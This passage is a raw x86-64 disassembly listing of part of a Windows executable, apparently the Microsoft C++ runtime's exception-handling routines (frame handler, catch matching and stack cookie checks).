   140004190:	44 3b 7d f0          	cmp    -0x10(%rbp),%r15d
   140004194:	0f 82 88 fe ff ff    	jb     0x140004022
   14000419a:	8b 06                	mov    (%rsi),%eax
   14000419c:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   1400041a1:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   1400041a6:	0f 82 f2 00 00 00    	jb     0x14000429e
   1400041ac:	48 63 5e 20          	movslq 0x20(%rsi),%rbx
   1400041b0:	85 db                	test   %ebx,%ebx
   1400041b2:	74 0a                	je     0x1400041be
   1400041b4:	e8 f7 f6 ff ff       	call   0x1400038b0
   1400041b9:	48 03 c3             	add    %rbx,%rax
   1400041bc:	75 1d                	jne    0x1400041db
   1400041be:	f6 46 24 04          	testb  $0x4,0x24(%rsi)
   1400041c2:	0f 84 d6 00 00 00    	je     0x14000429e
   1400041c8:	48 8b d6             	mov    %rsi,%rdx
   1400041cb:	49 8b ce             	mov    %r14,%rcx
   1400041ce:	e8 99 f2 ff ff       	call   0x14000346c
   1400041d3:	84 c0                	test   %al,%al
   1400041d5:	0f 85 c3 00 00 00    	jne    0x14000429e
   1400041db:	f6 46 24 04          	testb  $0x4,0x24(%rsi)
   1400041df:	0f 85 0f 01 00 00    	jne    0x1400042f4
   1400041e5:	48 63 5e 20          	movslq 0x20(%rsi),%rbx
   1400041e9:	85 db                	test   %ebx,%ebx
   1400041eb:	74 0b                	je     0x1400041f8
   1400041ed:	e8 be f6 ff ff       	call   0x1400038b0
   1400041f2:	48 8d 14 03          	lea    (%rbx,%rax,1),%rdx
   1400041f6:	eb 02                	jmp    0x1400041fa
   1400041f8:	33 d2                	xor    %edx,%edx
   1400041fa:	48 8b cf             	mov    %rdi,%rcx
   1400041fd:	e8 da 0b 00 00       	call   0x140004ddc
   140004202:	84 c0                	test   %al,%al
   140004204:	0f 85 94 00 00 00    	jne    0x14000429e
   14000420a:	4c 8d 4d 88          	lea    -0x78(%rbp),%r9
   14000420e:	4c 8b c6             	mov    %rsi,%r8
   140004211:	49 8b d6             	mov    %r14,%rdx
   140004214:	49 8b cc             	mov    %r12,%rcx
   140004217:	e8 e0 f2 ff ff       	call   0x1400034fc
   14000421c:	8a 8d 98 00 00 00    	mov    0x98(%rbp),%cl
   140004222:	4c 8b c8             	mov    %rax,%r9
   140004225:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   14000422a:	48 8b d7             	mov    %rdi,%rdx
   14000422d:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   140004231:	83 c9 ff             	or     $0xffffffff,%ecx
   140004234:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140004239:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140004240:	00 00 
   140004242:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140004246:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000424a:	49 8b cc             	mov    %r12,%rcx
   14000424d:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140004252:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004259:	00 00 
   14000425b:	e8 bc f4 ff ff       	call   0x14000371c
   140004260:	eb 3c                	jmp    0x14000429e
   140004262:	83 7e 0c 00          	cmpl   $0x0,0xc(%rsi)
   140004266:	76 36                	jbe    0x14000429e
   140004268:	80 bd 98 00 00 00 00 	cmpb   $0x0,0x98(%rbp)
   14000426f:	0f 85 9c 00 00 00    	jne    0x140004311
   140004275:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   14000427b:	4d 8b ce             	mov    %r14,%r9
   14000427e:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   140004283:	4d 8b c7             	mov    %r15,%r8
   140004286:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000428a:	49 8b d4             	mov    %r12,%rdx
   14000428d:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140004291:	48 8b cf             	mov    %rdi,%rcx
   140004294:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004299:	e8 7a 00 00 00       	call   0x140004318
   14000429e:	e8 59 ec ff ff       	call   0x140002efc
   1400042a3:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   1400042a8:	75 67                	jne    0x140004311
   1400042aa:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   1400042ae:	48 33 cc             	xor    %rsp,%rcx
   1400042b1:	e8 6a d7 ff ff       	call   0x140001a20
   1400042b6:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   1400042bd:	41 5f                	pop    %r15
   1400042bf:	41 5e                	pop    %r14
   1400042c1:	41 5d                	pop    %r13
   1400042c3:	41 5c                	pop    %r12
   1400042c5:	5f                   	pop    %rdi
   1400042c6:	5e                   	pop    %rsi
   1400042c7:	5b                   	pop    %rbx
   1400042c8:	5d                   	pop    %rbp
   1400042c9:	c3                   	ret
   1400042ca:	b2 01                	mov    $0x1,%dl
   1400042cc:	48 8b cf             	mov    %rdi,%rcx
   1400042cf:	e8 b0 e8 ff ff       	call   0x140002b84
   1400042d4:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400042d8:	e8 33 06 00 00       	call   0x140004910
   1400042dd:	48 8d 15 14 b4 01 00 	lea    0x1b414(%rip),%rdx        # 0x14001f6f8
   1400042e4:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400042e8:	e8 a7 ea ff ff       	call   0x140002d94
   1400042ed:	cc                   	int3
   1400042ee:	e8 51 4c 00 00       	call   0x140008f44
   1400042f3:	cc                   	int3
   1400042f4:	e8 03 ec ff ff       	call   0x140002efc
   1400042f9:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400042fd:	e8 fa eb ff ff       	call   0x140002efc
   140004302:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004307:	48 89 48 28          	mov    %rcx,0x28(%rax)
   14000430b:	e8 34 4c 00 00       	call   0x140008f44
   140004310:	cc                   	int3
   140004311:	e8 da 4c 00 00       	call   0x140008ff0
   140004316:	cc                   	int3
   140004317:	cc                   	int3
   140004318:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000431d:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140004322:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004327:	55                   	push   %rbp
   140004328:	56                   	push   %rsi
   140004329:	57                   	push   %rdi
   14000432a:	41 54                	push   %r12
   14000432c:	41 55                	push   %r13
   14000432e:	41 56                	push   %r14
   140004330:	41 57                	push   %r15
   140004332:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   140004339:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   14000433f:	49 8b e9             	mov    %r9,%rbp
   140004342:	4d 8b f8             	mov    %r8,%r15
   140004345:	4c 8b e2             	mov    %rdx,%r12
   140004348:	48 8b f1             	mov    %rcx,%rsi
   14000434b:	0f 84 07 02 00 00    	je     0x140004558
   140004351:	e8 a6 eb ff ff       	call   0x140002efc
   140004356:	44 8b ac 24 30 01 00 	mov    0x130(%rsp),%r13d
   14000435d:	00 
   14000435e:	44 8b b4 24 28 01 00 	mov    0x128(%rsp),%r14d
   140004365:	00 
   140004366:	48 8b bc 24 20 01 00 	mov    0x120(%rsp),%rdi
   14000436d:	00 
   14000436e:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   140004373:	74 5b                	je     0x1400043d0
   140004375:	33 c9                	xor    %ecx,%ecx
   140004377:	ff 15 3b 0e 01 00    	call   *0x10e3b(%rip)        # 0x1400151b8
   14000437d:	48 8b d8             	mov    %rax,%rbx
   140004380:	e8 77 eb ff ff       	call   0x140002efc
   140004385:	48 39 58 10          	cmp    %rbx,0x10(%rax)
   140004389:	74 45                	je     0x1400043d0
   14000438b:	81 3e 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rsi)
   140004391:	74 3d                	je     0x1400043d0
   140004393:	81 3e 52 43 43 e0    	cmpl   $0xe0434352,(%rsi)
   140004399:	74 35                	je     0x1400043d0
   14000439b:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   1400043a2:	00 
   1400043a3:	4c 8b cd             	mov    %rbp,%r9
   1400043a6:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   1400043ab:	4d 8b c7             	mov    %r15,%r8
   1400043ae:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400043b3:	49 8b d4             	mov    %r12,%rdx
   1400043b6:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400043bb:	48 8b ce             	mov    %rsi,%rcx
   1400043be:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400043c3:	e8 ec ef ff ff       	call   0x1400033b4
   1400043c8:	85 c0                	test   %eax,%eax
   1400043ca:	0f 85 88 01 00 00    	jne    0x140004558
   1400043d0:	48 8b 45 08          	mov    0x8(%rbp),%rax
   1400043d4:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400043d9:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   1400043de:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   1400043e2:	0f 86 8b 01 00 00    	jbe    0x140004573
   1400043e8:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400043ed:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400043f2:	4c 8b cd             	mov    %rbp,%r9
   1400043f5:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400043fa:	45 8b c6             	mov    %r14d,%r8d
   1400043fd:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
   140004404:	00 
   140004405:	e8 da f1 ff ff       	call   0x1400035e4
   14000440a:	0f 10 8c 24 98 00 00 	movups 0x98(%rsp),%xmm1
   140004411:	00 
   140004412:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140004416:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000441b:	66 0f 7e c0          	movd   %xmm0,%eax
   14000441f:	f3 0f 7f 4c 24 70    	movdqu %xmm1,0x70(%rsp)
   140004425:	3b 84 24 b0 00 00 00 	cmp    0xb0(%rsp),%eax
   14000442c:	0f 83 26 01 00 00    	jae    0x140004558
   140004432:	8b 5c 24 78          	mov    0x78(%rsp),%ebx
   140004436:	66 49 0f 7e c9       	movq   %xmm1,%r9
   14000443b:	4c 89 8c 24 00 01 00 	mov    %r9,0x100(%rsp)
   140004442:	00 
   140004443:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004448:	48 8b 00             	mov    (%rax),%rax
   14000444b:	48 63 50 10          	movslq 0x10(%rax),%rdx
   14000444f:	8b c3                	mov    %ebx,%eax
   140004451:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140004455:	49 8b 41 08          	mov    0x8(%r9),%rax
   140004459:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   14000445d:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   140004462:	49 63 54 00 10       	movslq 0x10(%r8,%rax,1),%rdx
   140004467:	89 94 24 90 00 00 00 	mov    %edx,0x90(%rsp)
   14000446e:	66 0f 7e c0          	movd   %xmm0,%eax
   140004472:	0f 11 84 24 80 00 00 	movups %xmm0,0x80(%rsp)
   140004479:	00 
   14000447a:	41 3b c6             	cmp    %r14d,%eax
   14000447d:	0f 8f be 00 00 00    	jg     0x140004541
   140004483:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140004488:	48 c1 e8 20          	shr    $0x20,%rax
   14000448c:	44 3b f0             	cmp    %eax,%r14d
   14000448f:	0f 8f ac 00 00 00    	jg     0x140004541
   140004495:	4c 8b 7d 08          	mov    0x8(%rbp),%r15
   140004499:	49 83 c7 ec          	add    $0xffffffffffffffec,%r15
   14000449d:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1400044a2:	66 48 0f 7e c0       	movq   %xmm0,%rax
   1400044a7:	48 c1 e8 20          	shr    $0x20,%rax
   1400044ab:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400044af:	48 8d 14 8a          	lea    (%rdx,%rcx,4),%rdx
   1400044b3:	4c 03 fa             	add    %rdx,%r15
   1400044b6:	4d 63 67 04          	movslq 0x4(%r15),%r12
   1400044ba:	45 85 e4             	test   %r12d,%r12d
   1400044bd:	74 25                	je     0x1400044e4
   1400044bf:	e8 ec f3 ff ff       	call   0x1400038b0
   1400044c4:	49 03 c4             	add    %r12,%rax
   1400044c7:	74 1b                	je     0x1400044e4
   1400044c9:	4d 63 67 04          	movslq 0x4(%r15),%r12
   1400044cd:	45 85 e4             	test   %r12d,%r12d
   1400044d0:	74 0a                	je     0x1400044dc
   1400044d2:	e8 d9 f3 ff ff       	call   0x1400038b0
   1400044d7:	49 03 c4             	add    %r12,%rax
   1400044da:	eb 02                	jmp    0x1400044de
   1400044dc:	33 c0                	xor    %eax,%eax
   1400044de:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   1400044e2:	75 5d                	jne    0x140004541
   1400044e4:	41 f6 07 40          	testb  $0x40,(%r15)
   1400044e8:	75 57                	jne    0x140004541
   1400044ea:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   1400044f1:	00 
   1400044f2:	4c 8b cd             	mov    %rbp,%r9
   1400044f5:	4c 8b 84 24 10 01 00 	mov    0x110(%rsp),%r8
   1400044fc:	00 
   1400044fd:	48 8b ce             	mov    %rsi,%rcx
   140004500:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
   140004507:	00 
   140004508:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   14000450d:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   140004512:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004517:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   14000451e:	00 
   14000451f:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   140004524:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004529:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140004530:	00 00 
   140004532:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   140004537:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000453c:	e8 0f f8 ff ff       	call   0x140003d50
   140004541:	4c 8b 8c 24 00 01 00 	mov    0x100(%rsp),%r9
   140004548:	00 
   140004549:	ff c3                	inc    %ebx
   14000454b:	3b 9c 24 b0 00 00 00 	cmp    0xb0(%rsp),%ebx
   140004552:	0f 82 eb fe ff ff    	jb     0x140004443
   140004558:	48 8b 9c 24 18 01 00 	mov    0x118(%rsp),%rbx
   14000455f:	00 
   140004560:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   140004567:	41 5f                	pop    %r15
   140004569:	41 5e                	pop    %r14
   14000456b:	41 5d                	pop    %r13
   14000456d:	41 5c                	pop    %r12
   14000456f:	5f                   	pop    %rdi
   140004570:	5e                   	pop    %rsi
   140004571:	5d                   	pop    %rbp
   140004572:	c3                   	ret
   140004573:	e8 78 4a 00 00       	call   0x140008ff0
   140004578:	cc                   	int3
   140004579:	cc                   	int3
   14000457a:	cc                   	int3
   14000457b:	cc                   	int3
   14000457c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004581:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004586:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000458b:	57                   	push   %rdi
   14000458c:	41 56                	push   %r14
   14000458e:	41 57                	push   %r15
   140004590:	48 83 ec 20          	sub    $0x20,%rsp
   140004594:	48 63 59 04          	movslq 0x4(%rcx),%rbx
   140004598:	33 ff                	xor    %edi,%edi
   14000459a:	4d 8b f8             	mov    %r8,%r15
   14000459d:	4c 8b f2             	mov    %rdx,%r14
   1400045a0:	48 8b f1             	mov    %rcx,%rsi
   1400045a3:	85 db                	test   %ebx,%ebx
   1400045a5:	0f 84 d2 00 00 00    	je     0x14000467d
   1400045ab:	e8 00 f3 ff ff       	call   0x1400038b0
   1400045b0:	4c 8b c8             	mov    %rax,%r9
   1400045b3:	4c 03 cb             	add    %rbx,%r9
   1400045b6:	0f 84 c1 00 00 00    	je     0x14000467d
   1400045bc:	48 63 5e 04          	movslq 0x4(%rsi),%rbx
   1400045c0:	85 db                	test   %ebx,%ebx
   1400045c2:	74 0b                	je     0x1400045cf
   1400045c4:	e8 e7 f2 ff ff       	call   0x1400038b0
   1400045c9:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   1400045cd:	eb 03                	jmp    0x1400045d2
   1400045cf:	48 8b cf             	mov    %rdi,%rcx
   1400045d2:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   1400045d6:	0f 84 a1 00 00 00    	je     0x14000467d
   1400045dc:	f6 06 80             	testb  $0x80,(%rsi)
   1400045df:	74 0a                	je     0x1400045eb
   1400045e1:	41 f6 06 10          	testb  $0x10,(%r14)
   1400045e5:	0f 85 92 00 00 00    	jne    0x14000467d
   1400045eb:	48 63 6e 04          	movslq 0x4(%rsi),%rbp
   1400045ef:	85 ed                	test   %ebp,%ebp
   1400045f1:	74 0b                	je     0x1400045fe
   1400045f3:	e8 b8 f2 ff ff       	call   0x1400038b0
   1400045f8:	48 8d 1c 28          	lea    (%rax,%rbp,1),%rbx
   1400045fc:	eb 03                	jmp    0x140004601
   1400045fe:	48 8b df             	mov    %rdi,%rbx
   140004601:	e8 be f2 ff ff       	call   0x1400038c4
   140004606:	49 63 4e 04          	movslq 0x4(%r14),%rcx
   14000460a:	48 03 c8             	add    %rax,%rcx
   14000460d:	48 3b d9             	cmp    %rcx,%rbx
   140004610:	74 37                	je     0x140004649
   140004612:	48 63 5e 04          	movslq 0x4(%rsi),%rbx
   140004616:	85 db                	test   %ebx,%ebx
   140004618:	74 0b                	je     0x140004625
   14000461a:	e8 91 f2 ff ff       	call   0x1400038b0
   14000461f:	48 8d 2c 03          	lea    (%rbx,%rax,1),%rbp
   140004623:	eb 03                	jmp    0x140004628
   140004625:	48 8b ef             	mov    %rdi,%rbp
   140004628:	49 63 5e 04          	movslq 0x4(%r14),%rbx
   14000462c:	e8 93 f2 ff ff       	call   0x1400038c4
   140004631:	48 8d 53 10          	lea    0x10(%rbx),%rdx
   140004635:	48 03 d0             	add    %rax,%rdx
   140004638:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000463c:	e8 2f fb 00 00       	call   0x140014170
   140004641:	85 c0                	test   %eax,%eax
   140004643:	74 04                	je     0x140004649
   140004645:	33 c0                	xor    %eax,%eax
   140004647:	eb 39                	jmp    0x140004682
   140004649:	b0 02                	mov    $0x2,%al
   14000464b:	41 84 06             	test   %al,(%r14)
   14000464e:	74 05                	je     0x140004655
   140004650:	f6 06 08             	testb  $0x8,(%rsi)
   140004653:	74 24                	je     0x140004679
   140004655:	41 f6 07 01          	testb  $0x1,(%r15)
   140004659:	74 05                	je     0x140004660
   14000465b:	f6 06 01             	testb  $0x1,(%rsi)
   14000465e:	74 19                	je     0x140004679
   140004660:	41 f6 07 04          	testb  $0x4,(%r15)
   140004664:	74 05                	je     0x14000466b
   140004666:	f6 06 04             	testb  $0x4,(%rsi)
   140004669:	74 0e                	je     0x140004679
   14000466b:	41 84 07             	test   %al,(%r15)
   14000466e:	74 04                	je     0x140004674
   140004670:	84 06                	test   %al,(%rsi)
   140004672:	74 05                	je     0x140004679
   140004674:	bf 01 00 00 00       	mov    $0x1,%edi
   140004679:	8b c7                	mov    %edi,%eax
   14000467b:	eb 05                	jmp    0x140004682
   14000467d:	b8 01 00 00 00       	mov    $0x1,%eax
   140004682:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004687:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000468c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004691:	48 83 c4 20          	add    $0x20,%rsp
   140004695:	41 5f                	pop    %r15
   140004697:	41 5e                	pop    %r14
   140004699:	5f                   	pop    %rdi
   14000469a:	c3                   	ret
   14000469b:	cc                   	int3
   14000469c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400046a1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400046a6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400046ab:	57                   	push   %rdi
   1400046ac:	41 56                	push   %r14
   1400046ae:	41 57                	push   %r15
   1400046b0:	48 83 ec 50          	sub    $0x50,%rsp
   1400046b4:	48 8b f9             	mov    %rcx,%rdi
   1400046b7:	49 8b f1             	mov    %r9,%rsi
   1400046ba:	49 8b c8             	mov    %r8,%rcx
   1400046bd:	4d 8b f8             	mov    %r8,%r15
   1400046c0:	4c 8b f2             	mov    %rdx,%r14
   1400046c3:	e8 dc e7 ff ff       	call   0x140002ea4
   1400046c8:	e8 2f e8 ff ff       	call   0x140002efc
   1400046cd:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400046d4:	00 
   1400046d5:	ba 29 00 00 80       	mov    $0x80000029,%edx
   1400046da:	b9 ff ff ff 1f       	mov    $0x1fffffff,%ecx
   1400046df:	41 b8 26 00 00 80    	mov    $0x80000026,%r8d
   1400046e5:	83 78 40 00          	cmpl   $0x0,0x40(%rax)
   1400046e9:	75 36                	jne    0x140004721
   1400046eb:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   1400046f1:	74 2e                	je     0x140004721
   1400046f3:	39 17                	cmp    %edx,(%rdi)
   1400046f5:	75 10                	jne    0x140004707
   1400046f7:	83 7f 18 0f          	cmpl   $0xf,0x18(%rdi)
   1400046fb:	75 0f                	jne    0x14000470c
   1400046fd:	48 81 7f 60 20 05 93 	cmpq   $0x19930520,0x60(%rdi)
   140004704:	19 
   140004705:	eb 03                	jmp    0x14000470a
   140004707:	44 39 07             	cmp    %r8d,(%rdi)
   14000470a:	74 15                	je     0x140004721
   14000470c:	8b 03                	mov    (%rbx),%eax
   14000470e:	23 c1                	and    %ecx,%eax
   140004710:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   140004715:	72 0a                	jb     0x140004721
   140004717:	f6 43 24 01          	testb  $0x1,0x24(%rbx)
   14000471b:	0f 85 83 01 00 00    	jne    0x1400048a4
   140004721:	f6 47 04 66          	testb  $0x66,0x4(%rdi)
   140004725:	0f 84 8f 00 00 00    	je     0x1400047ba
   14000472b:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   14000472f:	0f 84 6f 01 00 00    	je     0x1400048a4
   140004735:	83 bc 24 98 00 00 00 	cmpl   $0x0,0x98(%rsp)
   14000473c:	00 
   14000473d:	0f 85 61 01 00 00    	jne    0x1400048a4
   140004743:	f6 47 04 20          	testb  $0x20,0x4(%rdi)
   140004747:	74 5e                	je     0x1400047a7
   140004749:	44 39 07             	cmp    %r8d,(%rdi)
   14000474c:	75 37                	jne    0x140004785
   14000474e:	4c 8b 46 20          	mov    0x20(%rsi),%r8
   140004752:	48 8b d6             	mov    %rsi,%rdx
   140004755:	48 8b cb             	mov    %rbx,%rcx
   140004758:	e8 d7 f2 ff ff       	call   0x140003a34
   14000475d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004760:	0f 8c 5d 01 00 00    	jl     0x1400048c3
   140004766:	3b 43 04             	cmp    0x4(%rbx),%eax
   140004769:	0f 8d 54 01 00 00    	jge    0x1400048c3
   14000476f:	44 8b c8             	mov    %eax,%r9d
   140004772:	49 8b ce             	mov    %r14,%rcx
   140004775:	48 8b d6             	mov    %rsi,%rdx
   140004778:	4c 8b c3             	mov    %rbx,%r8
   14000477b:	e8 38 04 00 00       	call   0x140004bb8
   140004780:	e9 1f 01 00 00       	jmp    0x1400048a4
   140004785:	39 17                	cmp    %edx,(%rdi)
   140004787:	75 1e                	jne    0x1400047a7
   140004789:	44 8b 4f 38          	mov    0x38(%rdi),%r9d
   14000478d:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   140004791:	0f 8c 2c 01 00 00    	jl     0x1400048c3
   140004797:	44 3b 4b 04          	cmp    0x4(%rbx),%r9d
   14000479b:	0f 8d 22 01 00 00    	jge    0x1400048c3
   1400047a1:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   1400047a5:	eb ce                	jmp    0x140004775
   1400047a7:	4c 8b c3             	mov    %rbx,%r8
   1400047aa:	48 8b d6             	mov    %rsi,%rdx
   1400047ad:	49 8b ce             	mov    %r14,%rcx
   1400047b0:	e8 e3 ec ff ff       	call   0x140003498
   1400047b5:	e9 ea 00 00 00       	jmp    0x1400048a4
   1400047ba:	83 7b 0c 00          	cmpl   $0x0,0xc(%rbx)
   1400047be:	75 3b                	jne    0x1400047fb
   1400047c0:	8b 03                	mov    (%rbx),%eax
   1400047c2:	23 c1                	and    %ecx,%eax
   1400047c4:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   1400047c9:	72 17                	jb     0x1400047e2
   1400047cb:	48 63 6b 20          	movslq 0x20(%rbx),%rbp
   1400047cf:	85 ed                	test   %ebp,%ebp
   1400047d1:	74 0f                	je     0x1400047e2
   1400047d3:	e8 d8 f0 ff ff       	call   0x1400038b0
   1400047d8:	48 03 c5             	add    %rbp,%rax
   1400047db:	75 1e                	jne    0x1400047fb
   1400047dd:	b9 ff ff ff 1f       	mov    $0x1fffffff,%ecx
   1400047e2:	8b 03                	mov    (%rbx),%eax
   1400047e4:	23 c1                	and    %ecx,%eax
   1400047e6:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   1400047eb:	0f 82 b3 00 00 00    	jb     0x1400048a4
   1400047f1:	f6 43 24 04          	testb  $0x4,0x24(%rbx)
   1400047f5:	0f 84 a9 00 00 00    	je     0x1400048a4
   1400047fb:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140004801:	75 68                	jne    0x14000486b
   140004803:	83 7f 18 03          	cmpl   $0x3,0x18(%rdi)
   140004807:	72 62                	jb     0x14000486b
   140004809:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   140004810:	76 59                	jbe    0x14000486b
   140004812:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140004816:	48 63 68 08          	movslq 0x8(%rax),%rbp
   14000481a:	85 ed                	test   %ebp,%ebp
   14000481c:	74 4d                	je     0x14000486b
   14000481e:	e8 a1 f0 ff ff       	call   0x1400038c4
   140004823:	4c 8b d0             	mov    %rax,%r10
   140004826:	4c 03 d5             	add    %rbp,%r10
   140004829:	74 40                	je     0x14000486b
   14000482b:	0f b6 8c 24 a8 00 00 	movzbl 0xa8(%rsp),%ecx
   140004832:	00 
   140004833:	4c 8b ce             	mov    %rsi,%r9
   140004836:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   14000483a:	4d 8b c7             	mov    %r15,%r8
   14000483d:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
   140004844:	00 
   140004845:	49 8b d6             	mov    %r14,%rdx
   140004848:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000484d:	49 8b c2             	mov    %r10,%rax
   140004850:	8b 8c 24 98 00 00 00 	mov    0x98(%rsp),%ecx
   140004857:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000485b:	48 8b cf             	mov    %rdi,%rcx
   14000485e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004863:	ff 15 a7 0a 01 00    	call   *0x10aa7(%rip)        # 0x140015310
   140004869:	eb 3e                	jmp    0x1400048a9
   14000486b:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140004872:	00 
   140004873:	4c 8b ce             	mov    %rsi,%r9
   140004876:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000487b:	4d 8b c7             	mov    %r15,%r8
   14000487e:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   140004885:	49 8b d6             	mov    %r14,%rdx
   140004888:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000488c:	48 8b cf             	mov    %rdi,%rcx
   14000488f:	8a 84 24 a8 00 00 00 	mov    0xa8(%rsp),%al
   140004896:	88 44 24 28          	mov    %al,0x28(%rsp)
   14000489a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000489f:	e8 84 f5 ff ff       	call   0x140003e28
   1400048a4:	b8 01 00 00 00       	mov    $0x1,%eax
   1400048a9:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   1400048ae:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400048b2:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   1400048b6:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400048ba:	49 8b e3             	mov    %r11,%rsp
   1400048bd:	41 5f                	pop    %r15
   1400048bf:	41 5e                	pop    %r14
   1400048c1:	5f                   	pop    %rdi
   1400048c2:	c3                   	ret
   1400048c3:	e8 28 47 00 00       	call   0x140008ff0
   1400048c8:	cc                   	int3
   1400048c9:	cc                   	int3
   1400048ca:	cc                   	int3
   1400048cb:	cc                   	int3
   1400048cc:	e9 cb fd ff ff       	jmp    0x14000469c
   1400048d1:	cc                   	int3
   1400048d2:	cc                   	int3
   1400048d3:	cc                   	int3
   1400048d4:	40 53                	rex push %rbx
   1400048d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400048da:	48 8b d9             	mov    %rcx,%rbx
   1400048dd:	48 8b c2             	mov    %rdx,%rax
   1400048e0:	48 8d 0d 11 0f 01 00 	lea    0x10f11(%rip),%rcx        # 0x1400157f8
   1400048e7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400048ea:	48 89 0b             	mov    %rcx,(%rbx)
   1400048ed:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400048f1:	48 8d 48 08          	lea    0x8(%rax),%rcx
